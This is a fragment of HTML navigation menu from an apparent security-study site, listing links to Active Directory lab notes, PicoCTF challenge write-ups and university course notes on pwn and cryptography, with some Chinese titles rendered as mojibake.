href=/security/course/ntust-isc/ad/3.-%E6%9B%B4%E5%A4%9A%E5%AF%86%E7%A2%BC/ntustisc---ad-note---lab0x16%E9%80%8F%E9%81%8Emimikatz%E5%8F%96%E5%BE%97local-admin%E7%9A%84ntlm/index.html>NTUSTISC - AD Note - Lab(é€éMimikatzå–å¾—Local Adminçš„NTLM)</a></li><li data-nav-id=/security/course/ntust-isc/ad/4.-%E9%81%A0%E7%AB%AF%E5%9F%B7%E8%A1%8C-%E8%AE%80%E6%AA%94/ntustisc---ad-note---lab0x22%E9%81%A0%E7%AB%AF%E5%9F%B7%E8%A1%8Crdp/index.html><a class=padding href=/security/course/ntust-isc/ad/4.-%E9%81%A0%E7%AB%AF%E5%9F%B7%E8%A1%8C-%E8%AE%80%E6%AA%94/ntustisc---ad-note---lab0x22%E9%81%A0%E7%AB%AF%E5%9F%B7%E8%A1%8Crdp/index.html>NTUSTISC - AD Note - Lab(é ç«¯åŸ·è¡Œ(RDP))</a></li><li data-nav-id=/security/course/ntust-isc/ad/4.-%E9%81%A0%E7%AB%AF%E5%9F%B7%E8%A1%8C-%E8%AE%80%E6%AA%94/ntustisc---ad-note---lab0x23%E9%81%A0%E7%AB%AF%E5%9F%B7%E8%A1%8Crdp2/index.html><a class=padding href=/security/course/ntust-isc/ad/4.-%E9%81%A0%E7%AB%AF%E5%9F%B7%E8%A1%8C-%E8%AE%80%E6%AA%94/ntustisc---ad-note---lab0x23%E9%81%A0%E7%AB%AF%E5%9F%B7%E8%A1%8Crdp2/index.html>NTUSTISC - AD Note - Lab(é ç«¯åŸ·è¡Œ(RDP)2)</a></li><li data-nav-id=/security/course/ntust-isc/ad/2.-%E6%8F%90%E5%8D%87%E6%AC%8A%E9%99%90/ntustisc---ad-note---lab0x12%E9%8C%AF%E8%AA%A4%E9%85%8D%E7%BD%AE/index.html><a class=padding href=/security/course/ntust-isc/ad/2.-%E6%8F%90%E5%8D%87%E6%AC%8A%E9%99%90/ntustisc---ad-note---lab0x12%E9%8C%AF%E8%AA%A4%E9%85%8D%E7%BD%AE/index.html>NTUSTISC - AD Note - Lab(éŒ¯èª¤é…ç½®)</a></li><li data-nav-id=/security/course/ntust-isc/ad/3.-%E6%9B%B4%E5%A4%9A%E5%AF%86%E7%A2%BC/ntustisc---ad-note---lab0x19%E9%A1%AF%E7%A4%BAmimikatz%E7%9A%84%E6%98%8E%E6%96%87/index.html><a class=padding href=/security/course/ntust-isc/ad/3.-%E6%9B%B4%E5%A4%9A%E5%AF%86%E7%A2%BC/ntustisc---ad-note---lab0x19%E9%A1%AF%E7%A4%BAmimikatz%E7%9A%84%E6%98%8E%E6%96%87/index.html>NTUSTISC - AD Note - Lab(é¡¯ç¤ºMimikatzçš„æ˜æ–‡)</a></li><li data-nav-id=/security/course/ntust-isc/ad/ntustisc---ad-note---%E6%9C%83%E5%BE%8C%E6%8F%90%E5%8F%8A%E6%9C%89%E7%94%A8%E7%9A%84%E5%B7%A5%E5%85%B7/index.html><a class=padding href=/security/course/ntust-isc/ad/ntustisc---ad-note---%E6%9C%83%E5%BE%8C%E6%8F%90%E5%8F%8A%E6%9C%89%E7%94%A8%E7%9A%84%E5%B7%A5%E5%85%B7/index.html>NTUSTISC - AD Note - æœƒå¾ŒæåŠæœ‰ç”¨çš„å·¥å…·</a></li><li data-nav-id=/security/course/ntust-isc/ad/ntustisc---ad-note---0x01%E7%92%B0%E5%A2%83%E5%BB%BA%E7%BD%AE--background/index.html><a class=padding href=/security/course/ntust-isc/ad/ntustisc---ad-note---0x01%E7%92%B0%E5%A2%83%E5%BB%BA%E7%BD%AE--background/index.html>NTUSTISC - AD Note - ç’°å¢ƒå»ºç½® & Background</a></li><li data-nav-id=/security/course/ntust-isc/ad/1.-%E7%92%B0%E5%A2%83%E8%AA%BF%E6%9F%A5normal/ntustisc---ad-note---lab0x03%E6%9F%A5%E8%A9%A2%E7%B6%B2%E5%9F%9F%E4%BD%BF%E7%94%A8%E8%80%85/index.html><a class=padding href=/security/course/ntust-isc/ad/1.-%E7%92%B0%E5%A2%83%E8%AA%BF%E6%9F%A5normal/ntustisc---ad-note---lab0x03%E6%9F%A5%E8%A9%A2%E7%B6%B2%E5%9F%9F%E4%BD%BF%E7%94%A8%E8%80%85/index.html>NTUSTISC - AD Note(Lab - æŸ¥è©¢ç¶²åŸŸä½¿ç”¨è€…)</a></li><li data-nav-id=/security/practice/cyberdefender/endpoint-forensic/mrrobot---medium/cyberdefender---mrrobot---target-1/index.html><a class=padding href=/security/practice/cyberdefender/endpoint-forensic/mrrobot---medium/cyberdefender---mrrobot---target-1/index.html>NTUSTISC - CyberDefender - MrRobot - Target 1</a></li><li data-nav-id=/security/practice/picoctf/misc/image-stego/picoctf---tunn3l-v1s10n/index.html><a class=padding href=/security/practice/picoctf/misc/image-stego/picoctf---tunn3l-v1s10n/index.html>PicoCTF - `tunn3l v1s10n`</a></li><li data-nav-id=/security/practice/picoctf/misc/flow/picoctf---wireshark-doo-dooo-do-doo.../index.html><a class=padding href=/security/practice/picoctf/misc/flow/picoctf---wireshark-doo-dooo-do-doo.../index.html>PicoCTF - `Wireshark doo dooo do doo...`</a></li><li data-nav-id=/security/practice/picoctf/misc/image-stego/picoctf---advanced-potion-making/index.html><a class=padding href=/security/practice/picoctf/misc/image-stego/picoctf---advanced-potion-making/index.html>PicoCTF - advanced-potion-making</a></li><li data-nav-id=/security/practice/picoctf/crypto/des-aes/picoctf---aes-abc/index.html><a class=padding href=/security/practice/picoctf/crypto/des-aes/picoctf---aes-abc/index.html>PicoCTF - AES-ABC</a></li><li data-nav-id=/security/practice/picoctf/reverse/picoctf---armssembly-0/index.html><a class=padding href=/security/practice/picoctf/reverse/picoctf---armssembly-0/index.html>PicoCTF - ARMssembly 0</a></li><li data-nav-id=/security/practice/picoctf/reverse/picoctf---asm4/index.html><a class=padding href=/security/practice/picoctf/reverse/picoctf---asm4/index.html>PicoCTF - asm4</a></li><li data-nav-id=/security/practice/picoctf/pwn/picoctf---babygame01/index.html><a class=padding href=/security/practice/picoctf/pwn/picoctf---babygame01/index.html>PicoCTF - babygame01</a></li><li data-nav-id=/security/practice/picoctf/pwn/picoctf---babygame02/index.html><a class=padding href=/security/practice/picoctf/pwn/picoctf---babygame02/index.html>PicoCTF - babygame02</a></li><li data-nav-id=/security/practice/picoctf/pwn/picoctf---buffer-overflow-2/index.html><a class=padding href=/security/practice/picoctf/pwn/picoctf---buffer-overflow-2/index.html>PicoCTF - buffer overflow 2</a></li><li data-nav-id=/security/practice/picoctf/misc/image-stego/picoctf---c0rrupt/index.html><a class=padding href=/security/practice/picoctf/misc/image-stego/picoctf---c0rrupt/index.html>PicoCTF - c0rrupt</a></li><li data-nav-id=/security/practice/picoctf/web/picoctf---caas/index.html><a class=padding href=/security/practice/picoctf/web/picoctf---caas/index.html>PicoCTF - caas</a></li><li data-nav-id=/security/practice/picoctf/crypto/picoctf---compress-and-attack/index.html><a class=padding href=/security/practice/picoctf/crypto/picoctf---compress-and-attack/index.html>PicoCTF - Compress and Attack</a></li><li data-nav-id=/security/practice/picoctf/web/picoctf---cookies/index.html><a class=padding href=/security/practice/picoctf/web/picoctf---cookies/index.html>PicoCTF - Cookies</a></li><li data-nav-id=/security/practice/picoctf/crypto/rsa/picoctf---corrupt-key-1/index.html><a class=padding href=/security/practice/picoctf/crypto/rsa/picoctf---corrupt-key-1/index.html>PicoCTF - corrupt-key-1</a></li><li data-nav-id=/security/practice/picoctf/crypto/rsa/picoctf---dachshund-attacks/index.html><a class=padding href=/security/practice/picoctf/crypto/rsa/picoctf---dachshund-attacks/index.html>PicoCTF - Dachshund Attacks</a></li><li data-nav-id=/security/practice/picoctf/misc/disk/picoctf---disk-disk-sleuth-ii/index.html><a class=padding href=/security/practice/picoctf/misc/disk/picoctf---disk-disk-sleuth-ii/index.html>PicoCTF - Disk, disk, sleuth! II</a></li><li data-nav-id=/security/practice/picoctf/web/picoctf---dont-use-client-side/index.html><a class=padding href=/security/practice/picoctf/web/picoctf---dont-use-client-side/index.html>PicoCTF - dont-use-client-side</a></li><li data-nav-id=/security/practice/picoctf/crypto/des-aes/picoctf---double-des/index.html><a class=padding href=/security/practice/picoctf/crypto/des-aes/picoctf---double-des/index.html>PicoCTF - Double DES</a></li><li data-nav-id=/security/practice/picoctf/reverse/picoctf---droids1/index.html><a class=padding href=/security/practice/picoctf/reverse/picoctf---droids1/index.html>PicoCTF - droids1</a></li><li data-nav-id=/security/practice/picoctf/reverse/picoctf---droids3/index.html><a class=padding href=/security/practice/picoctf/reverse/picoctf---droids3/index.html>PicoCTF - droids3</a></li><li data-nav-id=/security/practice/picoctf/reverse/picoctf---droids4/index.html><a class=padding href=/security/practice/picoctf/reverse/picoctf---droids4/index.html>PicoCTF - droids4</a></li><li data-nav-id=/security/practice/picoctf/reverse/picoctf---easy-as-gdb/index.html><a class=padding href=/security/practice/picoctf/reverse/picoctf---easy-as-gdb/index.html>PicoCTF - Easy as GDB</a></li><li data-nav-id=/security/practice/picoctf/crypto/classic/picoctf---easy-peasy/index.html><a class=padding href=/security/practice/picoctf/crypto/classic/picoctf---easy-peasy/index.html>PicoCTF - Easy Peasy</a></li><li data-nav-id=/security/practice/picoctf/bad-questions/picoctf---easy-peasy-or-bad-questions/index.html><a class=padding href=/security/practice/picoctf/bad-questions/picoctf---easy-peasy-or-bad-questions/index.html>PicoCTF - Easy Peasy Or Bad Questions</a></li><li data-nav-id=/security/practice/picoctf/misc/flow/picoctf---eavesdrop/index.html><a class=padding href=/security/practice/picoctf/misc/flow/picoctf---eavesdrop/index.html>PicoCTF - Eavesdrop</a></li><li data-nav-id=/security/practice/picoctf/pwn/picoctf---fermat-strings/index.html><a class=padding href=/security/practice/picoctf/pwn/picoctf---fermat-strings/index.html>PicoCTF - fermat-strings</a></li><li data-nav-id=/security/practice/picoctf/misc/general/picoctf---file-types/index.html><a class=padding href=/security/practice/picoctf/misc/general/picoctf---file-types/index.html>PicoCTF - File types</a></li><li data-nav-id=/security/practice/picoctf/pwn/picoctf---filtered-shellcode/index.html><a class=padding href=/security/practice/picoctf/pwn/picoctf---filtered-shellcode/index.html>PicoCTF - filtered-shellcode</a></li><li data-nav-id=/security/practice/picoctf/pwn/picoctf---flag-leak/index.html><a class=padding href=/security/practice/picoctf/pwn/picoctf---flag-leak/index.html>PicoCTF - flag leak</a></li><li data-nav-id=/security/practice/picoctf/general-skills/picoctf---flag_shop/index.html><a class=padding href=/security/practice/picoctf/general-skills/picoctf---flag_shop/index.html>PicoCTF - flag_shop</a></li><li data-nav-id=/security/practice/picoctf/reverse/picoctf---forky/index.html><a class=padding href=/security/practice/picoctf/reverse/picoctf---forky/index.html>PicoCTF - Forky</a></li><li data-nav-id=/security/practice/picoctf/pwn/picoctf---function-overwrite/index.html><a class=padding href=/security/practice/picoctf/pwn/picoctf---function-overwrite/index.html>PicoCTF - function overwrite</a></li><li data-nav-id=/security/practice/picoctf/reverse/picoctf---gogo/index.html><a class=padding href=/security/practice/picoctf/reverse/picoctf---gogo/index.html>PicoCTF - gogo</a></li><li data-nav-id=/security/practice/picoctf/pwn/picoctf---guessing-game-1/index.html><a class=padding href=/security/practice/picoctf/pwn/picoctf---guessing-game-1/index.html>PicoCTF - Guessing Game 1</a></li><li data-nav-id=/security/practice/picoctf/pwn/picoctf---guessing-game-2/index.html><a class=padding href=/security/practice/picoctf/pwn/picoctf---guessing-game-2/index.html>PicoCTF - Guessing Game 2</a></li><li data-nav-id=/security/practice/picoctf/pwn/picoctf---hijacking/index.html><a class=padding href=/security/practice/picoctf/pwn/picoctf---hijacking/index.html>PicoCTF - hijacking</a></li><li data-nav-id=/security/practice/picoctf/misc/picoctf---information/index.html><a class=padding href=/security/practice/picoctf/misc/picoctf---information/index.html>PicoCTF - information</a></li><li data-nav-id=/security/practice/picoctf/web/picoctf---insp3ct0r/index.html><a class=padding href=/security/practice/picoctf/web/picoctf---insp3ct0r/index.html>PicoCTF - Insp3ct0r</a></li><li data-nav-id=/security/practice/picoctf/misc/general/picoctf---investigative-reversing-0/index.html><a class=padding href=/security/practice/picoctf/misc/general/picoctf---investigative-reversing-0/index.html>PicoCTF - Investigative Reversing 0</a></li><li data-nav-id=/security/practice/picoctf/web/picoctf---it-is-my-birthday/index.html><a class=padding href=/security/practice/picoctf/web/picoctf---it-is-my-birthday/index.html>PicoCTF - It is my Birthday</a></li><li data-nav-id=/security/practice/picoctf/crypto/rsa/picoctf---its-not-my-fault-1/index.html><a class=padding href=/security/practice/picoctf/crypto/rsa/picoctf---its-not-my-fault-1/index.html>PicoCTF - It's Not My Fault 1</a></li><li data-nav-id=/security/practice/picoctf/web/picoctf---jauth/index.html><a class=padding href=/security/practice/picoctf/web/picoctf---jauth/index.html>PicoCTF - JAUTH</a></li><li data-nav-id=/security/practice/picoctf/web/picoctf---java-code-analysis_/index.html><a class=padding href=/security/practice/picoctf/web/picoctf---java-code-analysis_/index.html>PicoCTF - Java Code Analysis!?!</a></li><li data-nav-id=/security/practice/picoctf/web/picoctf---java-script-kiddie/index.html><a class=padding href=/security/practice/picoctf/web/picoctf---java-script-kiddie/index.html>PicoCTF - Java Script Kiddie</a></li><li data-nav-id=/security/practice/picoctf/web/picoctf---jawt-scratchpad/index.html><a class=padding href=/security/practice/picoctf/web/picoctf---jawt-scratchpad/index.html>PicoCTF - JaWT Scratchpad</a></li><li data-nav-id=/security/practice/picoctf/crypto/rsa/picoctf---john_pollard/index.html><a class=padding href=/security/practice/picoctf/crypto/rsa/picoctf---john_pollard/index.html>PicoCTF - john_pollard</a></li><li data-nav-id=/security/practice/picoctf/pwn/picoctf---kit-engine/index.html><a class=padding href=/security/practice/picoctf/pwn/picoctf---kit-engine/index.html>PicoCTF - Kit Engine</a></li><li data-nav-id=/security/practice/picoctf/reverse/picoctf---lets-get-dynamic/index.html><a class=padding href=/security/practice/picoctf/reverse/picoctf---lets-get-dynamic/index.html>PicoCTF - Let's get dynamic</a></li><li data-nav-id=/security/practice/picoctf/misc/general/picoctf---like1000/index.html><a class=padding href=/security/practice/picoctf/misc/general/picoctf---like1000/index.html>PicoCTF - like1000</a></li><li data-nav-id=/security/practice/picoctf/misc/image-stego/picoctf---m00nwalk/index.html><a class=padding href=/security/practice/picoctf/misc/image-stego/picoctf---m00nwalk/index.html>PicoCTF - m00nwalk</a></li><li data-nav-id=/security/practice/picoctf/misc/image-stego/picoctf---m00nwalk2/index.html><a class=padding href=/security/practice/picoctf/misc/image-stego/picoctf---m00nwalk2/index.html>PicoCTF - m00nwalk2</a></li><li data-nav-id=/security/practice/picoctf/misc/general/picoctf---macrohard-weakedge/index.html><a class=padding href=/security/practice/picoctf/misc/general/picoctf---macrohard-weakedge/index.html>PicoCTF - MacroHard WeakEdge</a></li><li data-nav-id=/security/practice/picoctf/misc/general/picoctf---matryoshka-doll/index.html><a class=padding href=/security/practice/picoctf/misc/general/picoctf---matryoshka-doll/index.html>PicoCTF - Matryoshka doll</a></li><li data-nav-id=/security/practice/picoctf/crypto/rsa/picoctf---mind-your-ps-and-qs/index.html><a class=padding href=/security/practice/picoctf/crypto/rsa/picoctf---mind-your-ps-and-qs/index.html>PicoCTF - Mind your Ps and Qs</a></li><li data-nav-id=/security/practice/picoctf/crypto/rsa/picoctf---mini-rsa/index.html><a class=padding href=/security/practice/picoctf/crypto/rsa/picoctf---mini-rsa/index.html>PicoCTF - Mini RSA</a></li><li data-nav-id=/security/practice/picoctf/web/picoctf---more-sqli/index.html><a class=padding href=/security/practice/picoctf/web/picoctf---more-sqli/index.html>PicoCTF - More SQLi</a></li><li data-nav-id=/security/practice/picoctf/web/picoctf---most-cookies/index.html><a class=padding href=/security/practice/picoctf/web/picoctf---most-cookies/index.html>PicoCTF - Most Cookies</a></li><li data-nav-id=/security/practice/picoctf/general-skills/picoctf---mus1c/index.html><a class=padding href=/security/practice/picoctf/general-skills/picoctf---mus1c/index.html>PicoCTF - mus1c</a></li><li data-nav-id=/security/practice/picoctf/crypto/classic/picoctf---new-caesar/index.html><a class=padding href=/security/practice/picoctf/crypto/classic/picoctf---new-caesar/index.html>PicoCTF - New Caesar</a></li><li data-nav-id=/security/practice/picoctf/crypto/rsa/picoctf---no-padding-no-problem/index.html><a class=padding href=/security/practice/picoctf/crypto/rsa/picoctf---no-padding-no-problem/index.html>PicoCTF - No Padding, No Problem</a></li><li data-nav-id=/security/practice/picoctf/reverse/picoctf---no-way-out/index.html><a class=padding href=/security/practice/picoctf/reverse/picoctf---no-way-out/index.html>PicoCTF - No way out</a></li><li data-nav-id=/security/practice/picoctf/reverse/picoctf---not-crypto/index.html><a class=padding href=/security/practice/picoctf/reverse/picoctf---not-crypto/index.html>PicoCTF - not crypto</a></li><li data-nav-id=/security/practice/picoctf/web/picoctf---notepad/index.html><a class=padding href=/security/practice/picoctf/web/picoctf---notepad/index.html>PicoCTF - notepad</a></li><li data-nav-id=/security/practice/picoctf/crypto/rsa/picoctf---nsa-backdoor/index.html><a class=padding href=/security/practice/picoctf/crypto/rsa/picoctf---nsa-backdoor/index.html>PicoCTF - NSA Backdoor</a></li><li data-nav-id=/security/practice/picoctf/misc/disk/picoctf---operation-oni/index.html><a class=padding href=/security/practice/picoctf/misc/disk/picoctf---operation-oni/index.html>PicoCTF - Operation Oni</a></li><li data-nav-id=/security/practice/picoctf/misc/disk/picoctf---operation-orchid/index.html><a class=padding href=/security/practice/picoctf/misc/disk/picoctf---operation-orchid/index.html>PicoCTF - Operation Orchid</a></li><li data-nav-id=/security/practice/picoctf/reverse/picoctf---otp-implementation/index.html><a class=padding href=/security/practice/picoctf/reverse/picoctf---otp-implementation/index.html>PicoCTF - OTP Implementation</a></li><li data-nav-id=/security/practice/picoctf/reverse/picoctf---picker-iii/index.html><a class=padding href=/security/practice/picoctf/reverse/picoctf---picker-iii/index.html>PicoCTF - Picker III</a></li><li data-nav-id=/security/practice/picoctf/misc/disk/picoctf---pitter-patter-platters/index.html><a class=padding href=/security/practice/picoctf/misc/disk/picoctf---pitter-patter-platters/index.html>PicoCTF - Pitter, Patter, Platters</a></li><li data-nav-id=/security/practice/picoctf/crypto/sidechannel/picoctf---poweranalysis-part-1-_-part-2/index.html><a class=padding href=/security/practice/picoctf/crypto/sidechannel/picoctf---poweranalysis-part-1-_-part-2/index.html>PicoCTF - PowerAnalysis Part 1 / Part 2</a></li><li data-nav-id=/security/practice/picoctf/reverse/picoctf---powershelly/index.html><a class=padding href=/security/practice/picoctf/reverse/picoctf---powershelly/index.html>PicoCTF - Powershelly</a></li><li data-nav-id=/security/practice/picoctf/general-skills/picoctf---pw-crack-4/index.html><a class=padding href=/security/practice/picoctf/general-skills/picoctf---pw-crack-4/index.html>PicoCTF - PW Crack 4</a></li><li data-nav-id=/security/practice/picoctf/pwn/picoctf---ropfu/index.html><a class=padding href=/security/practice/picoctf/pwn/picoctf---ropfu/index.html>PicoCTF - ropfu</a></li><li data-nav-id=/security/practice/picoctf/pwn/picoctf---rps/index.html><a class=padding href=/security/practice/picoctf/pwn/picoctf---rps/index.html>PicoCTF - RPS</a></li><li data-nav-id=/security/practice/picoctf/pwn/picoctf---saas/index.html><a class=padding href=/security/practice/picoctf/pwn/picoctf---saas/index.html>PicoCTF - SaaS</a></li><li data-nav-id=/security/practice/picoctf/web/picoctf---scavenger-hunt/index.html><a class=padding href=/security/practice/picoctf/web/picoctf---scavenger-hunt/index.html>PicoCTF - Scavenger Hunt</a></li><li data-nav-id=/security/practice/picoctf/misc/flow/picoctf---scrambled-bytes/index.html><a class=padding href=/security/practice/picoctf/misc/flow/picoctf---scrambled-bytes/index.html>PicoCTF - scrambled-bytes</a></li><li data-nav-id=/security/practice/picoctf/crypto/rsa/picoctf---scrambled_-rsa/index.html><a class=padding href=/security/practice/picoctf/crypto/rsa/picoctf---scrambled_-rsa/index.html>PicoCTF - Scrambled: RSA</a></li><li data-nav-id=/security/practice/picoctf/web/picoctf---secrets/index.html><a class=padding href=/security/practice/picoctf/web/picoctf---secrets/index.html>PicoCTF - Secrets</a></li><li data-nav-id=/security/practice/picoctf/pwn/picoctf---seed-spring/index.html><a class=padding href=/security/practice/picoctf/pwn/picoctf---seed-spring/index.html>PicoCTF - seed-sPRiNG</a></li><li data-nav-id=/security/practice/picoctf/crypto/classic/picoctf---sequences/index.html><a class=padding href=/security/practice/picoctf/crypto/classic/picoctf---sequences/index.html>PicoCTF - Sequences</a></li><li data-nav-id=/security/practice/picoctf/misc/flow/picoctf---shark-on-wire-1/index.html><a class=padding href=/security/practice/picoctf/misc/flow/picoctf---shark-on-wire-1/index.html>PicoCTF - shark on wire 1</a></li><li data-nav-id=/security/practice/picoctf/misc/flow/picoctf---shark-on-wire-2/index.html><a class=padding href=/security/practice/picoctf/misc/flow/picoctf---shark-on-wire-2/index.html>PicoCTF - shark on wire 2</a></li><li data-nav-id=/security/practice/picoctf/misc/general/picoctf---sidechannel/index.html><a class=padding href=/security/practice/picoctf/misc/general/picoctf---sidechannel/index.html>PicoCTF - SideChannel</a></li><li data-nav-id=/security/practice/picoctf/misc/disk/picoctf---sleuthkit-intro/index.html><a class=padding href=/security/practice/picoctf/misc/disk/picoctf---sleuthkit-intro/index.html>PicoCTF - Sleuthkit Intro</a></li><li data-nav-id=/security/practice/picoctf/web/picoctf---some-assembly-required-1/index.html><a class=padding href=/security/practice/picoctf/web/picoctf---some-assembly-required-1/index.html>PicoCTF - Some Assembly Required 1</a></li><li data-nav-id=/security/practice/picoctf/web/picoctf---some-assembly-required-2/index.html><a class=padding href=/security/practice/picoctf/web/picoctf---some-assembly-required-2/index.html>PicoCTF - Some Assembly Required 2</a></li><li data-nav-id=/security/practice/picoctf/web/picoctf---some-assembly-required-3/index.html><a class=padding href=/security/practice/picoctf/web/picoctf---some-assembly-required-3/index.html>PicoCTF - Some Assembly Required 3</a></li><li data-nav-id=/security/practice/picoctf/general-skills/picoctf---special--specialer/index.html><a class=padding href=/security/practice/picoctf/general-skills/picoctf---special--specialer/index.html>PicoCTF - Special & Specialer</a></li><li data-nav-id=/security/practice/picoctf/web/picoctf---sqlilite/index.html><a class=padding href=/security/practice/picoctf/web/picoctf---sqlilite/index.html>PicoCTF - SQLiLite</a></li><li data-nav-id=/security/practice/picoctf/crypto/rsa/picoctf---sra/index.html><a class=padding href=/security/practice/picoctf/crypto/rsa/picoctf---sra/index.html>PicoCTF - SRA</a></li><li data-nav-id=/security/practice/picoctf/pwn/picoctf---stack-cache/index.html><a class=padding href=/security/practice/picoctf/pwn/picoctf---stack-cache/index.html>PicoCTF - stack cache</a></li><li data-nav-id=/security/practice/picoctf/pwn/picoctf---stonk-market/index.html><a class=padding href=/security/practice/picoctf/pwn/picoctf---stonk-market/index.html>PicoCTF - Stonk Market</a></li><li data-nav-id=/security/practice/picoctf/web/picoctf---super-serial/index.html><a class=padding href=/security/practice/picoctf/web/picoctf---super-serial/index.html>PicoCTF - Super Serial</a></li><li data-nav-id=/security/practice/picoctf/misc/audio/picoctf---surfing-the-waves/index.html><a class=padding href=/security/practice/picoctf/misc/audio/picoctf---surfing-the-waves/index.html>PicoCTF - Surfing the Waves</a></li><li data-nav-id=/security/practice/picoctf/pwn/picoctf---tic-tac/index.html><a class=padding href=/security/practice/picoctf/pwn/picoctf---tic-tac/index.html>PicoCTF - tic-tac</a></li><li data-nav-id=/security/practice/picoctf/misc/flow/picoctf---torrent-analyze/index.html><a class=padding href=/security/practice/picoctf/misc/flow/picoctf---torrent-analyze/index.html>PicoCTF - Torrent Analyze</a></li><li data-nav-id=/security/practice/picoctf/reverse/picoctf---transformation/index.html><a class=padding href=/security/practice/picoctf/reverse/picoctf---transformation/index.html>PicoCTF - Transformation</a></li><li data-nav-id=/security/practice/picoctf/misc/flow/picoctf---trivial-flag-transfer-protocol/index.html><a class=padding href=/security/practice/picoctf/misc/flow/picoctf---trivial-flag-transfer-protocol/index.html>PicoCTF - Trivial Flag Transfer Protocol</a></li><li data-nav-id=/security/practice/picoctf/pwn/picoctf---two-sum/index.html><a class=padding href=/security/practice/picoctf/pwn/picoctf---two-sum/index.html>PicoCTF - two-sum</a></li><li data-nav-id=/security/practice/picoctf/pwn/picoctf---unsubscriptions-are-free/index.html><a class=padding href=/security/practice/picoctf/pwn/picoctf---unsubscriptions-are-free/index.html>PicoCTF - Unsubscriptions Are Free</a></li><li data-nav-id=/security/practice/picoctf/crypto/rsa/picoctf---very-smooth/index.html><a class=padding href=/security/practice/picoctf/crypto/rsa/picoctf---very-smooth/index.html>PicoCTF - Very Smooth</a></li><li data-nav-id=/security/practice/picoctf/pwn/picoctf---vne/index.html><a class=padding href=/security/practice/picoctf/pwn/picoctf---vne/index.html>PicoCTF - VNE</a></li><li data-nav-id=/security/practice/picoctf/misc/flow/picoctf---webnet0/index.html><a class=padding href=/security/practice/picoctf/misc/flow/picoctf---webnet0/index.html>PicoCTF - WebNet0</a></li><li data-nav-id=/security/practice/picoctf/misc/general/picoctf---whitepages/index.html><a class=padding href=/security/practice/picoctf/misc/general/picoctf---whitepages/index.html>PicoCTF - WhitePages</a></li><li data-nav-id=/security/practice/picoctf/web/picoctf---who-are-you_/index.html><a class=padding href=/security/practice/picoctf/web/picoctf---who-are-you_/index.html>PicoCTF - Who are you?</a></li><li data-nav-id=/security/practice/picoctf/misc/flow/picoctf---wireshark-twoo-twooo-two-twoo_/index.html><a class=padding href=/security/practice/picoctf/misc/flow/picoctf---wireshark-twoo-twooo-two-twoo_/index.html>PicoCTF - Wireshark twoo twooo two twoo...</a></li><li data-nav-id=/security/practice/picoctf/reverse/picoctf---wizardlike/index.html><a class=padding href=/security/practice/picoctf/reverse/picoctf---wizardlike/index.html>PicoCTF - Wizardlike</a></li><li data-nav-id=/security/practice/picoctf/misc/flow/picoctf---wpa-ing-out/index.html><a class=padding href=/security/practice/picoctf/misc/flow/picoctf---wpa-ing-out/index.html>PicoCTF - WPA-ing Out</a></li><li data-nav-id=/security/practice/picoctf/pwn/picoctf---x-sixty-what/index.html><a class=padding href=/security/practice/picoctf/pwn/picoctf---x-sixty-what/index.html>PicoCTF - x-sixty-what</a></li><li data-nav-id=/security/practice/picoctf/crypto/classic/picoctf---xtraordinary/index.html><a class=padding href=/security/practice/picoctf/crypto/classic/picoctf---xtraordinary/index.html>PicoCTF - XtraORdinary</a></li><li data-nav-id=/security/competition/picoctf-2023/index.html><a class=padding href=/security/competition/picoctf-2023/index.html>PicoCTF 2023</a></li><li data-nav-id=/security/course/ntu-cs/pwn/simple-buffer-overflow---0x00/index.html><a class=padding href=/security/course/ntu-cs/pwn/simple-buffer-overflow---0x00/index.html>Simple Buffer Overflow - 0x00</a></li><li data-nav-id=/security/course/ntu-cs/pwn/simple-buffer-overflow---0x01/index.html><a class=padding href=/security/course/ntu-cs/pwn/simple-buffer-overflow---0x01/index.html>Simple Buffer Overflow - 0x01</a></li><li data-nav-id=/security/course/ntu-cs/pwn/simple-buffer-overflow---0x02/index.html><a class=padding href=/security/course/ntu-cs/pwn/simple-buffer-overflow---0x02/index.html>Simple Buffer Overflow - 0x02</a></li><li data-nav-id=/security/course/ntu-cs/pwn/simple-buffer-overflow---0x04/index.html><a class=padding href=/security/course/ntu-cs/pwn/simple-buffer-overflow---0x04/index.html>Simple Buffer Overflow - 0x04</a></li><li data-nav-id=/security/course/ntu-cs/pwn/simple-buffer-overflow---0x05leak-canary/index.html><a class=padding href=/security/course/ntu-cs/pwn/simple-buffer-overflow---0x05leak-canary/index.html>Simple Buffer Overflow - 0x05(Leak Canary)</a></li><li data-nav-id=/security/course/ntu-cs/crypto/simple-crypto---0x01modular-operation/index.html><a class=padding href=/security/course/ntu-cs/crypto/simple-crypto---0x01modular-operation/index.html>Simple Crypto - 0x01(Modular Operation)</a></li><li data-nav-id=/security/course/ntu-cs/crypto/simple-crypto---0x02random-number-generator---lcg/index.html><a class=padding href=/security/course/ntu-cs/crypto/simple-crypto---0x02random-number-generator---lcg/index.html>Simple Crypto - 0x02(Random Number Generator - LCG)</a></li><li data-nav-id=/security/course/ntu-cs/crypto/simple-crypto---0x032023-lab---cor/index.html><a class=padding href=/security/course/ntu-cs/crypto/simple-crypto---0x032023-lab---cor/index.html>Simple Crypto - 0x03(2023 Lab - COR)</a></li><li data-nav-id=/security/course/ntu-cs/crypto/simple-crypto---0x03lab---lfsr/index.html><a class=padding href=/security/course/ntu-cs/crypto/simple-crypto---0x03lab---lfsr/index.html>Simple Crypto - 0x03(Lab - LFSR)</a></li><li data-nav-id=/security/course/ntu-cs/crypto/simple-crypto---0x042023-lab---poa/index.html><a class=padding href=/security/course/ntu-cs/crypto/simple-crypto---0x042023-lab---poa/index.html>Simple Crypto - 0x04(2023 Lab - POA)</a></li><li data-nav-id=/security/course/ntu-cs/crypto/simple-crypto---0x052023-lab---lsb/index.html><a class=padding href=/security/course/ntu-cs/crypto/simple-crypto---0x052023-lab---lsb/index.html>Simple Crypto - 0x05(2023 Lab - LSB)</a></li><li data-nav-id=/security/course/ntu-cs/crypto/simple-crypto---0x062023-hw---lfsr/index.html><a class=padding href=/security/course/ntu-cs/crypto/simple-crypto---0x062023-hw---lfsr/index.html>Simple Crypto - 0x06(2023 HW - LFSR)</a></li><li data-nav-id=/security/course/ntu-cs/crypto/simple-crypto---0x072023-hw---oracle/index.html><a class=padding href=/security/course/ntu-cs/crypto/simple-crypto---0x072023-hw---oracle/index.html>Simple Crypto - 0x07(2023 HW - Oracle)</a></li><li data-nav-id=/security/course/ntu-cs/crypto/simple-crypto---0x082023-lab---dlog/index.html><a class=padding href=/security/course/ntu-cs/crypto/simple-crypto---0x082023-lab---dlog/index.html>Simple Crypto - 0x08(2023 Lab - dlog)</a></li><li 